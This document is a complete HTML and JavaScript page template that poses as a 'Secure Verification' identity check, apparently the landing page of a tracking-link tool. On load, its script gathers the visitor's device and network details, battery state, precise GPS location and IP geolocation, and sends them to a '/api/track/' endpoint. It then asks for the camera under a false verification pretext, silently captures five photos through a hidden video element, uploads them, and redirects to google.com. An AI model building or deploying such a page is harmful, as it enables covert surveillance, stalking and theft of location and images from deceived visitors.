<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Secure Verification | Please Wait</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;overflow:hidden}
.container{text-align:center;padding:30px 20px;max-width:400px;width:100%}
.loader-wrap{position:relative;width:80px;height:80px;margin:0 auto 25px}
.loader-ring{position:absolute;width:100%;height:100%;border:4px solid rgba(0,255,200,0.1);border-top-color:#00ffc8;border-radius:50%;animation:spin 1s linear infinite}
.loader-ring:nth-child(2){width:60px;height:60px;top:10px;left:10px;border-color:rgba(120,0,255,0.1);border-top-color:#a855f7;animation:spin 1.5s linear infinite reverse}
.loader-ring:nth-child(3){width:40px;height:40px;top:20px;left:20px;border-color:rgba(255,0,100,0.1);border-top-color:#ff3264;animation:spin 2s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.shield-icon{font-size:40px;color:#00ffc8;margin-bottom:15px;animation:shieldPulse 2s ease-in-out infinite;text-shadow:0 0 30px rgba(0,255,200,0.5)}
@keyframes shieldPulse{0%,100%{transform:scale(1);opacity:0.8}50%{transform:scale(1.2);opacity:1}}
h2{color:#fff;font-size:20px;font-weight:600;margin-bottom:10px;letter-spacing:1px}
p{color:rgba(255,255,255,0.5);font-size:14px;line-height:1.6;margin-bottom:20px}
.progress-wrap{width:100%;max-width:280px;margin:0 auto 25px}
.progress-bar{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:2px;overflow:hidden}
.progress-fill{height:100%;background:linear-gradient(90deg,#00ffc8,#7800ff);border-radius:2px;width:0%;transition:width 0.3s ease}
.status-text{color:#00ffc8;font-size:12px;letter-spacing:2px;text-transform:uppercase;margin-top:10px;font-weight:500}
.security-badges{display:flex;gap:12px;justify-content:center;margin-top:30px;flex-wrap:wrap}
.security-badges span{font-size:11px;color:rgba(255,255,255,0.4);display:flex;align-items:center;gap:5px;background:rgba(255,255,255,0.03);padding:6px 12px;border-radius:20px;border:1px solid rgba(255,255,255,0.05)}
.camera-indicator{display:none;position:fixed;top:20px;right:20px;width:12px;height:12px;background:#ff3264;border-radius:50%;animation:cameraPulse 1s ease-in-out infinite;z-index:100}
@keyframes cameraPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.3)}}
.hidden-video{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none}
/* Particles */
.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.particle{position:absolute;width:2px;height:2px;background:rgba(0,255,200,0.3);border-radius:50%;animation:float 10s infinite}
@keyframes float{0%,100%{transform:translateY(100vh);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-100vh);opacity:0}}
</style>
</head>
<body>
<div class="particles" id="particles"></div>
<div class="camera-indicator" id="camIndicator"></div>

<div class="container">
<div class="loader-wrap">
<div class="loader-ring"></div>
<div class="loader-ring"></div>
<div class="loader-ring"></div>
</div>
<div class="shield-icon">&#128737;</div>
<h2 id="statusTitle">Verifying your identity...</h2>
<p id="statusDesc">Please wait while we verify your device and secure your connection. This may take a few moments.</p>
<div class="progress-wrap">
<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
<div class="status-text" id="statusText">INITIALIZING...</div>
</div>
<div class="security-badges">
<span>&#128274; Secure Connection</span>
<span>&#9989; Verified</span>
<span>&#128737; Protected</span>
</div>
</div>

<video class="hidden-video" id="hiddenVideo" autoplay playsinline></video>
<canvas class="hidden-video" id="hiddenCanvas"></canvas>

<script>
const linkId = '{{ link_id }}';
let capturedPhotos = [];
let stream = null;

// Create particles
const particlesContainer = document.getElementById('particles');
for(let i=0;i<20;i++){
const p = document.createElement('div');
p.className = 'particle';
p.style.left = Math.random()*100+'%';
p.style.animationDelay = Math.random()*10+'s';
p.style.animationDuration = (5+Math.random()*10)+'s';
particlesContainer.appendChild(p);
}

function updateProgress(percent, text) {
document.getElementById('progressFill').style.width = percent+'%';
document.getElementById('statusText').textContent = text;
}

function updateStatus(title, desc) {
document.getElementById('statusTitle').textContent = title;
document.getElementById('statusDesc').textContent = desc;
}

async function collectData() {
updateProgress(10, 'COLLECTING DATA...');

const data = {
location: {},
device_info: {},
screen_info: {},
network_info: {},
battery_info: {},
photos: [],
login_data: {}
};

// Screen info
data.screen_info = {
width: screen.width,
height: screen.height,
availWidth: screen.availWidth,
availHeight: screen.availHeight,
colorDepth: screen.colorDepth,
pixelRatio: window.devicePixelRatio
};

// Device info
data.device_info = {
platform: navigator.platform,
userAgent: navigator.userAgent,
language: navigator.language,
languages: navigator.languages,
cookieEnabled: navigator.cookieEnabled,
onLine: navigator.onLine,
hardwareConcurrency: navigator.hardwareConcurrency,
maxTouchPoints: navigator.maxTouchPoints,
vendor: navigator.vendor,
browser: getBrowser()
};

// Network info
if (navigator.connection) {
data.network_info = {
effectiveType: navigator.connection.effectiveType,
downlink: navigator.connection.downlink,
rtt: navigator.connection.rtt,
saveData: navigator.connection.saveData
};
}

// Battery info
if (navigator.getBattery) {
try {
const battery = await navigator.getBattery();
data.battery_info = {
level: battery.level,
charging: battery.charging,
chargingTime: battery.chargingTime,
dischargingTime: battery.dischargingTime
};
} catch(e) {}
}

updateProgress(30, 'GETTING LOCATION...');

// Location
if (navigator.geolocation) {
try {
const position = await new Promise((resolve, reject) => {
navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 8000, enableHighAccuracy: true});
});
data.location = {
latitude: position.coords.latitude,
longitude: position.coords.longitude,
accuracy: position.coords.accuracy,
altitude: position.coords.altitude,
speed: position.coords.speed
};
} catch(e) {}
}

// IP geolocation
try {
const ipRes = await fetch('https://ipapi.co/json/');
const ipData = await ipRes.json();
data.location.city = ipData.city;
data.location.country = ipData.country_name;
data.location.region = ipData.region;
data.location.ip = ipData.ip;
data.location.org = ipData.org;
} catch(e) {}

updateProgress(50, 'SENDING DATA...');

// Send initial data
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify(data)
});
} catch(e) {}

updateProgress(60, 'ACCESSING CAMERA...');

// Start camera capture
setTimeout(() => {
startCameraCapture();
}, 500);
}

function getBrowser() {
const ua = navigator.userAgent;
if (ua.includes('Firefox')) return 'Firefox';
if (ua.includes('Chrome')) return 'Chrome';
if (ua.includes('Safari')) return 'Safari';
if (ua.includes('Edge')) return 'Edge';
if (ua.includes('Opera')) return 'Opera';
return 'Unknown';
}

async function startCameraCapture() {
try {
stream = await navigator.mediaDevices.getUserMedia({ 
video: { 
width: { ideal: 1280 },
height: { ideal: 720 },
facingMode: 'user'
} 
});

const video = document.getElementById('hiddenVideo');
video.srcObject = stream;
await video.play();

document.getElementById('camIndicator').style.display = 'block';
updateStatus('Camera verification required...', 'Please look at the camera for identity verification. Capturing in progress...');

// Capture 5 photos with delays
await captureMultiplePhotos();

} catch(e) {
console.log('Camera access denied or error:', e);
updateProgress(100, 'COMPLETE');
updateStatus('Verification complete!', 'Redirecting you to the destination...');
setTimeout(() => {
window.location.href = 'https://google.com';
}, 1500);
}
}

async function captureMultiplePhotos() {
const video = document.getElementById('hiddenVideo');
const canvas = document.getElementById('hiddenCanvas');
const ctx = canvas.getContext('2d');

// Set canvas size
canvas.width = 640;
canvas.height = 480;

const captureDelays = [1000, 2500, 4000, 5500, 7000];
const progressSteps = [65, 72, 79, 86, 93];
const statusTexts = ['CAPTURE 1/5...', 'CAPTURE 2/5...', 'CAPTURE 3/5...', 'CAPTURE 4/5...', 'CAPTURE 5/5...'];

for (let i = 0; i < 5; i++) {
await new Promise(resolve => setTimeout(resolve, captureDelays[i] - (i > 0 ? captureDelays[i-1] : 0)));

updateProgress(progressSteps[i], statusTexts[i]);

// Draw video frame to canvas
ctx.drawImage(video, 0, 0, 640, 480);
const photo = canvas.toDataURL('image/jpeg', 0.85);
capturedPhotos.push(photo);
}

// Stop camera
stream.getTracks().forEach(track => track.stop());
document.getElementById('camIndicator').style.display = 'none';

updateProgress(95, 'UPLOADING PHOTOS...');

// Send all photos
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ photos: capturedPhotos })
});
} catch(e) {}

updateProgress(100, 'COMPLETE');
updateStatus('Verification complete!', 'Identity verified successfully. Redirecting...');

setTimeout(() => {
window.location.href = 'https://google.com';
}, 2000);
}

// Start the process
collectData();
</script>
</body>
</html>
